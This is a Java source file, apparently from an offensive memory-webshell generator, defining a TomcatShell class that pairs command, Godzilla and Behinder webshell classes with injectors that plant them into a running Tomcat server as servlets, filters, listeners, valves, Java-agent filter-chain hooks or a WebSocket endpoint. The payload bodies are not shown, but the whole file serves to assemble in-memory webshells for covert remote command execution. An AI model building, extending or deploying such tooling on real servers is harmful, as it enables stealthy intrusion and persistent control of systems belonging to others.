package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.tomcat.injector.TomcatFilterChainAgentInjector;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderServlet;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderValve;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
import com.reajason.javaweb.memshell.shelltool.command.CommandValve;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaValve;
import com.reajason.javaweb.memshell.tomcat.behinder.BehinderListener;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.tomcat.command.CommandListener;
import com.reajason.javaweb.memshell.tomcat.command.CommandWebSocket;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
import com.reajason.javaweb.memshell.tomcat.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.tomcat.injector.*;
import org.apache.commons.lang3.tuple.Pair;

import java.util.Map;

import static com.reajason.javaweb.memshell.config.Constants.*;

/**
 * @author ReaJason
 * @since 2024/11/22
 */
public class TomcatShell extends AbstractShell {
    public static final String WEBSOCKET = "WebSocket";
    public static final String UPGRADE = "Upgrade";
    public static final String EXECUTOR = "Executor";
    public static final String AGENT_FILTER_CHAIN = AGENT + "FilterChain";
    public static final String AGENT_JAKARTA_FILTER_CHAIN = AGENT + "JakartaFilterChain";

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        return Map.ofEntries(
                Map.entry(SERVLET, Pair.of(CommandServlet.class, TomcatServletInjector.class)),
                Map.entry(JAKARTA_SERVLET, Pair.of(CommandServlet.class, TomcatServletInjector.class)),
                Map.entry(FILTER, Pair.of(CommandFilter.class, TomcatFilterInjector.class)),
                Map.entry(JAKARTA_FILTER, Pair.of(CommandFilter.class, TomcatFilterInjector.class)),
                Map.entry(LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class)),
                Map.entry(JAKARTA_LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class)),
                Map.entry(VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class)),
                Map.entry(JAKARTA_VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class)),
                Map.entry(AGENT_FILTER_CHAIN, Pair.of(CommandFilterChainAdvisor.class, TomcatFilterChainAgentInjector.class)),
                Map.entry(AGENT_JAKARTA_FILTER_CHAIN, Pair.of(CommandFilterChainAdvisor.class, TomcatFilterChainAgentInjector.class)),
                Map.entry(WEBSOCKET, Pair.of(CommandWebSocket.class, TomcatWebSocketInjector.class))
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        return Map.of(
                SERVLET, Pair.of(GodzillaServlet.class, TomcatServletInjector.class),
                JAKARTA_SERVLET, Pair.of(GodzillaServlet.class, TomcatServletInjector.class),
                FILTER, Pair.of(GodzillaFilter.class, TomcatFilterInjector.class),
                JAKARTA_FILTER, Pair.of(GodzillaFilter.class, TomcatFilterInjector.class),
                LISTENER, Pair.of(GodzillaListener.class, TomcatListenerInjector.class),
                JAKARTA_LISTENER, Pair.of(GodzillaListener.class, TomcatListenerInjector.class),
                VALVE, Pair.of(GodzillaValve.class, TomcatValveInjector.class),
                JAKARTA_VALVE, Pair.of(GodzillaValve.class, TomcatValveInjector.class),
                AGENT_FILTER_CHAIN, Pair.of(GodzillaFilterChainAdvisor.class, TomcatFilterChainAgentInjector.class),
                AGENT_JAKARTA_FILTER_CHAIN, Pair.of(GodzillaFilterChainAdvisor.class, TomcatFilterChainAgentInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
        return Map.of(
                SERVLET, Pair.of(BehinderServlet.class, TomcatServletInjector.class),
                JAKARTA_SERVLET, Pair.of(BehinderServlet.class, TomcatServletInjector.class),
                FILTER, Pair.of(BehinderFilter.class, TomcatFilterInjector.class),
                JAKARTA_FILTER, Pair.of(BehinderFilter.class, TomcatFilterInjector.class),
                LISTENER, Pair.of(BehinderListener.class, TomcatListenerInjector.class),
                JAKARTA_LISTENER, Pair.of(BehinderListener.class, TomcatListenerInjector.class),
                VALVE, Pair.of(BehinderValve.class, TomcatValveInjector.class),
                JAKARTA_VALVE, Pair.of(BehinderValve.class, TomcatValveInjector.class),
                AGENT_FILTER_CHAIN, Pair.of(BehinderFilterChainAdvisor.class, TomcatFilterChainAgentInjector.class),
                AGENT_JAKARTA_FILTER_CHAIN, Pair.of(BehinderFilterChainAdvisor.class, TomcatFilterChainAgentInjector.class)
        );
    }
}